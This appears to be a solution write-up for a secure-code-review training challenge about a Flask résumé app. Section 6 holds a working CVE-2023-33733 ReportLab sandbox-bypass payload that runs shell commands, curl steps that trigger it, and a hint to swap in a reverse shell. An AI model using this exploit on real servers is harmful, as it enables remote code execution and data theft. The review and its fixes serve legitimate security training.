# Secure Code Review — Challenge #2: Professional — Solution

<table>
<tr>
<td width="100%">

<a href="https://youtu.be/2j3dM9OiOT0">
  <img src="https://img.youtube.com/vi/2j3dM9OiOT0/hqdefault.jpg" align="right" width="240" alt="Watch the walkthrough">
</a>

### 🎥 This solution is explained in detail on my YouTube Channel <img src="../../assets/AppSec_Untangled_Logo.jpg" width="30"> [AppSec Untangled](https://www.youtube.com/@AppSecUntangled)

Full walkthrough of the review process, the finding, and the fix.

[![Watch on YouTube](https://img.shields.io/badge/▶_Watch_the_walkthrough-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtu.be/2j3dM9OiOT0)

</td>
</tr>
</table>

## 1. 🗺️ Application scope & architecture

**What it does:** "Professional" lets users register, log in, create one or more professional
profiles (bio + work experience), mark each profile public or private, and export a profile as a
**PDF résumé**.

**Tech stack:** Python 3 · Flask · MongoDB (via PyMongo) · JWT auth (PyJWT/HS256) · bcrypt password
hashing · ReportLab for PDF generation · packaged with Docker Compose (app container + `mongo:6.0`).

**Roles:** two states only — **anonymous** (can view public profiles) and **authenticated user**
(owns their own profiles). There is no admin role.

**The libraries in play** (a review reasons about dependencies, not just app code):

| Library | What it is |
| --- | --- |
| **[Flask](https://flask.palletsprojects.com/)** | Minimal Python web framework — functions decorated with `@app.route(...)` become HTTP endpoints. |
| **[MongoDB](https://www.mongodb.com/docs/)** + **[PyMongo](https://pymongo.readthedocs.io/)** | NoSQL document database; queries are Python dicts, e.g. `find_one({'username': name})`. |
| **[PyJWT](https://pyjwt.readthedocs.io/)** | Creates/verifies **JWT**s — signed tokens that prove identity without server-side sessions. Signed here with `HS256` (shared secret). |
| **[bcrypt](https://pypi.org/project/bcrypt/)** | Slow, salted password hashing. |
| **[ReportLab](https://docs.reportlab.com/)** | Builds PDF files in Python. |

**Key assets:** user credentials (bcrypt hashes), private profile data, and the integrity of the
server itself.

### 🧭 How the application runs (code flow)

Following the code from the container down to the rendered UI:

1. **Compose brings up two containers.**
   [`docker-compose.yml`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/docker-compose.yml#L3-L24)
   defines an `app` service (built from the local `Dockerfile`, published on
   [`5000:5000`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/docker-compose.yml#L6-L7),
   given
   [`MONGODB_URI=mongodb://mongodb:27017/`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/docker-compose.yml#L8-L9))
   and a
   [`mongodb`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/docker-compose.yml#L17-L24)
   service running `mongo:6.0` — **no auth configured on Mongo**, reachable by the app over the
   private Docker network.

2. **The image builds and drops privileges.**
   The [`Dockerfile`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/Dockerfile#L1-L25)
   starts from `python:3.10.14-slim`, installs
   [`requirements.txt`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/Dockerfile#L11-L12),
   copies the code, then creates and switches to a **non-root**
   [`appuser`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/Dockerfile#L18-L19)
   before the entrypoint
   [`CMD ["python", "app.py"]`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/Dockerfile#L25).
   *(Non-root limits blast radius but doesn't stop code execution inside the container.)*

3. **`app.py` is the entrypoint.**
   At import it creates the Flask app and loads the JWT signing secret from the environment
   ([`app.py:17-18`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L17-L18)),
   instantiates the data-access stores
   ([`app.py:21-22`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L21-L22)),
   and at the bottom starts the dev server with
   [`app.run(host='0.0.0.0', port=5000, debug=True)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L238-L239).

4. **Routes live in `app.py`.**
   Every endpoint is a `@app.route(...)` function — auth
   ([register](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L30-L58),
   [login](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L60-L96))
   and profiles
   ([list/create](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L98-L143),
   [get/update/delete](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L145-L211),
   [résumé](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L213-L236)).

5. **Auth is a decorator/middleware.**
   Protected routes are wrapped with `@authenticate_token` from
   [`middleware.py:5-51`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L5-L51):
   it pulls the `Bearer` token from the `Authorization` header
   ([`:23-28`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L23-L28)),
   verifies it with
   [`jwt.decode(..., algorithms=['HS256'])`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L38),
   and attaches
   [`request.current_user_id`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L47-L48).

6. **Data access is in `store.py`.**
   [`UserStore`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py#L18-L55)
   and
   [`ProfileStore`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py#L57-L112)
   wrap the Mongo collections
   ([client init](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py#L6-L16)).

7. **PDF generation is in `pdf_generator.py`.**
   [`generate_resume_pdf(profile)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L14)
   builds the résumé with ReportLab and is called by the résumé route.

8. **The UI is static, served by Flask.**
   [`index()`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L25-L28)
   returns
   [`static/index.html`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/index.html),
   which loads
   [`static/app.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/app.js).
   The JS is a thin client: it stores the JWT in `sessionStorage`
   ([`app.js:7-16`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/app.js#L7-L16)),
   attaches it as a `Bearer` header on each `fetch`
   ([`app.js:37-51`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/app.js#L37-L51)),
   and renders responses into the DOM. Same backend routes as the API — one backend, two clients.

---

## 2. 🚪 Entry points

Every place untrusted input enters. "Auth" = requires a valid JWT (`@authenticate_token`).

| Method | Path                                                                                                                                                    | Auth / role | Untrusted input                                 |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------------- |
| POST   | [`/register`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L30)            | None        | `username`, `password` (JSON)                   |
| POST   | [`/login`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L60)               | None        | `username`, `password` (JSON)                   |
| GET    | [`/profiles`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L98)            | None        | — (lists public profiles)                       |
| POST   | [`/profiles`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L118)           | ✅           | `bio`, `work_experiences[]`, `is_private`       |
| GET    | [`/profiles/my`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L107)        | ✅           | — (uses `current_user_id` from JWT)             |
| GET    | [`/profiles/<id>`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L145)      | None*       | `id` (URL)                                      |
| PUT    | [`/profiles/<id>`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L163)      | ✅           | `bio`, `work_experiences[]`, `is_private`, `id` |
| DELETE | [`/profiles/<id>`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L193)      | ✅           | `id` (URL)                                      |
| POST   | [`/profiles/my/resume`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L213) | ✅           | — (reads the caller's stored profile)           |

> \* `GET /profiles/<id>` has **no** `@authenticate_token` decorator — noted for the authorization
> analysis in §5.

---

## 3. 🎯 Dangerous sinks (code & dependencies)

Places where user input could change behavior. These are **candidates** — §5 decides which are
actually reachable/exploitable.

| Sink                                               | Location                                                                                                                                                                      | Fed from                                  |
| -------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| MongoDB queries (`find_one`, `find`, `update_one`) | [`store.py`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py)                                     | username, profile fields                  |
| `ObjectId(profile_id)`                             | [`store.py:72,98,104`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py#L70-L104)                  | `<id>` from URL                           |
| DOM rendering in the UI                            | [`static/app.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/app.js)                           | API JSON                                  |
| ReportLab `Paragraph()` markup parser              | [`pdf_generator.py:39,50,57-64`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L39-L64) | `bio`, work-experience fields, `username` |

**A note on S1** — ReportLab's `Paragraph()` does not treat its argument as plain text: it parses a
small **XML/HTML-like markup language** (tags like `<b>`, `<br/>`, `<font color="...">` — see the
[ReportLab User Guide, Paragraph markup](https://docs.reportlab.com/reportlab/userguide/ch6_paragraphs/)).
In `pdf_generator.py`, user-controlled text is handed to `Paragraph()` with **no escaping**
([bio → `Paragraph`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L50),
[experience fields in markup](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L57-L64),
[username in title](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L39)).
Untrusted input reaching a markup parser unescaped — carried into §5 as a lead.

---

## 4 and 5. 🧩 Threat model & 🔍mitigation review

Applying both categories — **business-logic** (should be there, per entry point) and **source→sink**
(shouldn't be reachable, per sink) — and verifying each against the code. Each block: the threat →
related entry points/sinks → expected mitigation (with references) → where it's handled in code →
verdict. *(The one real finding is placed last so the flow reads cleanly.)*

### 🔓 **Business-logic vulnerabilities**

#### Broken authentication
- **Entry points / sinks:** all `@authenticate_token` routes; `/login`.
- **Expected mitigation:** verify JWTs with a pinned algorithm (never accept `alg:none` /
  algorithm-confusion — [PortSwigger: JWT algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion),
  [PyJWT algorithms](https://pyjwt.readthedocs.io/en/stable/algorithms.html)); store passwords with a
  slow salted hash ([OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)).
- **In the code:** decode pins `algorithms=['HS256']`
  ([`middleware.py:38`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L38));
  passwords hashed/verified with bcrypt
  ([hash `app.py:47`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L47),
  [verify `app.py:78`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L78)).
- **Verdict:** ✅ Mitigated. *(Caveat: the signing secret ships as the `.env.example` placeholder — an
  operational weakness to flag, not a planted app bug.)*

#### Broken authorization / IDOR
- **Entry points / sinks:** `PUT`/`DELETE /profiles/<id>`, `/profiles/my`, `/profiles/my/resume`.
- **Expected mitigation:** enforce per-object ownership server-side and derive identity from the
  session/token, not from client input
  ([OWASP IDOR Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html),
  [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)).
- **In the code:** ownership checked before mutating
  ([update `app.py:175`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L175),
  [delete `app.py:203`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L203));
  identity comes from the token
  ([`middleware.py:47-48`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L47-L48)),
  never from the request body.
- **Verdict:** ✅ Mitigated. No IDOR.

#### Private-profile exposure
- **Entry points / sinks:** `GET /profiles/<id>`.
- **Expected mitigation:** private records must be readable only by their owner (access control on
  read — [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)).
- **In the code:** the route has **no** `@authenticate_token`, so `request.current_user_id` is never
  set; the private-check branch therefore returns **404 to everyone, including the owner**
  ([`app.py:145-157`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L145-L157)).
- **Verdict:** ✅ Not exploitable (over-restrictive *functional* bug, not a data leak).

#### CSRF
- **Entry points / sinks:** all mutating routes (`POST`/`PUT`/`DELETE`).
- **Expected mitigation:** for cookie-based auth use anti-CSRF tokens / `SameSite`; token-in-header
  auth is inherently not CSRF-able because the browser won't attach it automatically
  ([OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)).
- **In the code:** auth is a `Bearer` token read from `sessionStorage` and set by JS
  ([`app.js:39`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/app.js#L39),
  [header check `middleware.py:23`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/middleware.py#L23));
  there is no auth cookie.
- **Verdict:** ✅ Mitigated. No ambient credential to ride.

### 💉 **Source-to-sink (injection) vulnerabilities**

#### NoSQL injection
- **Entry points / sinks:** every place untrusted input reaches a MongoDB query (S2, S3) — the two
  representative ones are `/login` (input from the **JSON body**) and any `/<id>` route (input from
  the **URL path**).
- **Expected mitigation:** never let untrusted input become query **operators**; validate types
  and/or cast to string, and validate identifier formats
  ([OWASP NoSQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html),
  [PyMongo `ObjectId`](https://pymongo.readthedocs.io/en/stable/api/bson/objectid.html)).
- **In the code — why `/login` can't be injected:** `username` flows into
  [`find_one({'username': username})`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py#L34-L36).
  Because it comes from the JSON body, a dict like `{"$ne": null}` *could* match a user — but login
  then requires the real password via
  [`bcrypt.checkpw(...)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L78),
  and `password.encode()` throws if `password` isn't a string. So the operator trick can't complete
  an auth bypass.
- **In the code — why the `ObjectId` path can't be injected:** an `/<id>` value flows into
  [`ObjectId(profile_id)`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/store.py#L72).
  A URL **path segment is always a plain string** — it can't carry a dict/operator — so injection is
  structurally impossible here; the worst case is an invalid string raising inside `ObjectId()`,
  caught by the route's `try/except` → HTTP 500 (a nuisance, not injection).
- **Verdict:** ✅ Not exploitable. `/login` is gated by bcrypt; the `ObjectId` path can't carry
  operators in the first place.

#### Stored/DOM XSS in the UI
- **Entry points / sinks:** profile fields rendered by the browser (S4).
- **Expected mitigation:** render untrusted data as text, not HTML; add a restrictive CSP
  ([OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html),
  [MDN `textContent`](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent),
  [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)).
- **In the code:** the UI builds nodes with `textContent`/element properties, never `innerHTML`
  ([`app.js`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/app.js)),
  plus a CSP with `script-src 'self'`
  ([`index.html:6-7`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/static/index.html#L6-L7)).
- **Verdict:** ✅ Mitigated.

#### 💥 RCE via known-vulnerable dependency (ReportLab) — **the finding**
- **Entry points / sinks:** `POST /profiles` (stores `bio`) → S1, triggered by
  `POST /profiles/my/resume`.
- **Expected mitigation:** (a) don't run a dependency with a known RCE — keep components patched
  ([OWASP A06:2021 – Vulnerable & Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/));
  and (b) never pass untrusted input into a markup/template engine unescaped
  ([ReportLab Paragraph markup](https://docs.reportlab.com/reportlab/userguide/ch6_paragraphs/)).
- **In the code:** `requirements.txt` pins
  [`reportlab==3.6.9`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/requirements.txt#L5)
- Using `grype` or any other vulnerability scanner we can find that this version is vulnerable to [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733) . https://github.com/anchore/grype
```
$ grype .
 ✔ Indexed file system                                                                                                                                   .
 ✔ Cataloged contents                                                                     cdb4ee2aea69cc6a83331bbe96dc2caa9a299d21329efb0336fc02a82e1839a8
   ├── ✔ Packages                        [7 packages]
   ├── ✔ Executables                     [0 executables]
   ├── ✔ File digests                    [1 files]
   └── ✔ File metadata                   [1 locations]
 ✔ Scanned for vulnerabilities     [16 vulnerability matches]
   ├── by severity: 0 critical, 4 high, 10 medium, 2 low, 0 negligible
   └── by status:   16 fixed, 0 not-fixed, 0 ignored
[0000]  WARN no explicit name and version provided for directory source, deriving artifact ID from the given path (which is not ideal) from=syft
NAME           INSTALLED  FIXED IN  TYPE    VULNERABILITY        SEVERITY  EPSS         RISK
werkzeug       2.3.7      3.0.3     python  GHSA-2g68-c3qc-8985  High      3.4% (87th)  2.5
reportlab      3.6.9      3.6.13    python  GHSA-9q9m-c65c-37pq  High      2.1% (80th)  1.6
werkzeug       2.3.7      3.0.6     python  GHSA-q34m-jh98-gwm2  Medium    1.1% (62nd)  0.7
werkzeug       2.3.7      2.3.8     python  GHSA-hrfv-mqp8-q5rw  Medium    1.1% (61st)  0.6
werkzeug       2.3.7      3.0.6     python  GHSA-f9vj-2wh5-fj8j  Medium    0.8% (52nd)  0.4
pymongo        4.5.0      4.6.3     python  GHSA-m87m-mmvp-v9qm  Medium    0.7% (48th)  0.3
werkzeug       2.3.7      3.1.6     python  GHSA-29vq-49wr-vm6x  Medium    0.6% (43rd)  0.3
pyjwt          2.8.0      2.13.0    python  GHSA-xgmm-8j9v-c9wx  High      0.4% (32nd)  0.3
werkzeug       2.3.7      3.1.4     python  GHSA-hgf8-39gv-g3f2  Medium    0.5% (41st)  0.3
werkzeug       2.3.7      3.1.5     python  GHSA-87hc-h4r5-73f7  Medium    0.4% (34th)  0.2
pyjwt          2.8.0      2.12.0    python  GHSA-752w-5fwx-jx9f  High      0.3% (18th)  0.2
pyjwt          2.8.0      2.13.0    python  GHSA-w7vc-732c-9m39  Medium    0.4% (29th)  0.2
python-dotenv  1.0.0      1.2.2     python  GHSA-mf9w-mj56-hr94  Medium    0.3% (17th)  0.1
pyjwt          2.8.0      2.13.0    python  GHSA-fhv5-28vv-h8m8  Low       0.3% (26th)  0.1
pyjwt          2.8.0      2.13.0    python  GHSA-993g-76c3-p5m4  Medium    0.2% (12th)  0.1
flask          2.3.3      3.1.3     python  GHSA-68rp-wp8r-4726  Low       0.3% (26th)  < 0.1
```

- CVE PoC https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897
- the attacker-controlled `bio` is rendered verbatim by  [`Paragraph(profile['bio'])`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L50)
  with no escaping.
- **Verdict:** ❌ **NOT mitigated.** Both controls are absent: outdated component **and** unescaped
  input into its markup parser. Full analysis and exploit in §6.

---

## 6. 🧪 The vulnerability & exploitation

- **Class:** Remote Code Execution via a **known-vulnerable dependency**
  (OWASP [A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)), reached
  through code-injection into a markup/expression sink
  ([CWE-94](https://cwe.mitre.org/data/definitions/94.html) /
  [CWE-95](https://cwe.mitre.org/data/definitions/95.html)).
- **CVE:** [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733) ·
  [Snyk advisory & PoC](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897).
  Affects **ReportLab ≤ 3.6.12**; fixed in **3.6.13**. This app pins **3.6.9**.
- **Location:** source =
  [`bio` accepted at `app.py:125-135`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L125-L135);
  sink =
  [`Paragraph(profile['bio'])` at `pdf_generator.py:50`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/pdf_generator.py#L50),
  rendered by
  [`POST /profiles/my/resume`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L213-L236).

### 🧠 Why it works

1. ReportLab styles paragraph text with markup, and the **`color`** attribute of `<font>` can be a
   *Python expression* that ReportLab evaluates to compute the color.
2. Originally this used a plain `eval()` —
   [CVE-2019-17626](https://nvd.nist.gov/vuln/detail/CVE-2019-17626) (straight RCE). ReportLab
   patched it with a **sandbox**, `rl_safe_eval`, meant to block dangerous names/attributes.
3. **CVE-2023-33733 is a bypass of that sandbox.** The public payload defines a `str` **subclass**
   ("`Word`") whose `__eq__`/`__hash__` are overridden so the sandbox's blocklist check sees the name
   as harmless, while the object still yields the **real** attribute string when used. That smuggles
   `__globals__` → the `os` module → `os.system("<command>")` past the sandbox → arbitrary command
   execution during PDF rendering.
4. Here nothing escapes the `bio`, so an attacker simply stores the `<font>` payload as their bio and
   requests their résumé.

### 🚀 Exploitation steps / PoC (tested)

The only quoting trick is `jq -Rs .`, which safely turns the payload file into a JSON string (the
payload contains quotes/brackets that would otherwise break the JSON body).

```bash
# 1. Save the CVE-2023-33733 payload to a file. It runs: touch /tmp/exploited
cat > payload <<'EOF'
<para>
  <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
    exploit
  </font>
</para>
EOF

# 2. Register a user
curl -s -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}'

# 3. Log in and grab the JWT
JWT_TOKEN=$(curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}' | jq -r '.token')

# 4. Create a profile whose bio *is* the payload (jq -Rs safely JSON-encodes the file)
curl -s -X POST http://localhost:5000/profiles \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -d "{\"bio\": $(jq -Rs . < payload)}"

# 5. Generate the résumé PDF → parses the bio markup → runs the command
curl -s -X POST http://localhost:5000/profiles/my/resume \
  -H "Authorization: Bearer $JWT_TOKEN" \
  --output resume.pdf
```

**Verify the command ran inside the app container:**

```bash
docker exec -it $(docker ps -q --filter "name=app") ls -la /tmp/exploited
# → file exists ⇒ arbitrary command executed on the server 💥
# Swap `touch /tmp/exploited` for a reverse shell / data exfil to show real impact.
```

**Impact:** code execution as `appuser` inside the app container — enough to read the app's secrets,
reach the **unauthenticated MongoDB** over the Docker network, and pivot. Non-root only limits, not
prevents, the damage.

---

## 7. 🛠️ Suggested fix

**Primary fix — patch the dependency (root cause):** upgrade ReportLab past the vulnerable range.
Minimum patched release is **3.6.13**; latest 4.x is better.

```txt
# requirements.txt
reportlab==4.0.7   # was 3.6.9 (CVE-2023-33733); 3.6.13 is the minimum patched version
```

**Defense-in-depth (do these too — don't rely on any single control):**

1. **Escape user input before it becomes markup.** Even patched, `Paragraph()` treats input as
   markup, so escape untrusted text so it renders literally:
   ```python
   from xml.sax.saxutils import escape
   story.append(Paragraph(escape(profile['bio'])))
   # escape() every work-experience field and the username before interpolating them too
   ```
2. **Input validation / allowlisting** at the API boundary
   ([OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html))
   — restrict characters/length on profile fields so such payloads can't be stored.
3. **Automated dependency scanning in CI** — this is an "outdated component" bug, so
   [`pip-audit`](https://pypi.org/project/pip-audit/), [Snyk](https://snyk.io/),
   [Dependabot](https://docs.github.com/en/code-security/dependabot).
4. **Harden the runtime** — the container already runs as non-root
   ([`Dockerfile:18-19`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/Dockerfile#L18-L19));
   go further by rendering PDFs in a locked-down worker (no outbound network, minimal FS), enabling
   **MongoDB authentication**, and disabling Flask
   [`debug=True`](https://github.com/mohamed-osama-aboelkheir/the-secure-code-review-challenge/blob/main/challenges/002-professional/app.py#L238-L239)
   outside local dev (its interactive debugger is itself an RCE vector).

---

## 8. 🌍 Real-world grounding & resources

- **CVE-2023-33733** — ReportLab `rl_safe_eval` sandbox bypass via `<font color>`.
  [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-33733) ·
  [Snyk (PoC)](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897).
- **CVE-2019-17626** — the earlier plain-`eval` RCE the sandbox was meant to fix (the "why the
  sandbox exists" backstory). [NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-17626).
- **Equifax 2017** — canonical "unpatched known-vulnerable component → RCE → mass breach" case
  (Apache Struts [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638); ~147M records).
  [CSO writeup](https://www.csoonline.com/article/567833/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html).
- **OWASP** — [A06:2021 Vulnerable & Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
  · [A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/).
- **CWE** — [CWE-94 Code Injection](https://cwe.mitre.org/data/definitions/94.html) ·
  [CWE-95 Eval Injection](https://cwe.mitre.org/data/definitions/95.html).
- **ReportLab markup reference** —
  [User Guide, Paragraph XML markup](https://docs.reportlab.com/reportlab/userguide/ch6_paragraphs/).

**Takeaway:** the app's own code is fairly clean — the fatal flaw is a **vulnerable library**
(ReportLab 3.6.9) reached through **unescaped user text in a PDF markup sink**. The lesson is both
"patch your dependencies" *and* "never feed untrusted input into a markup/template engine unescaped."
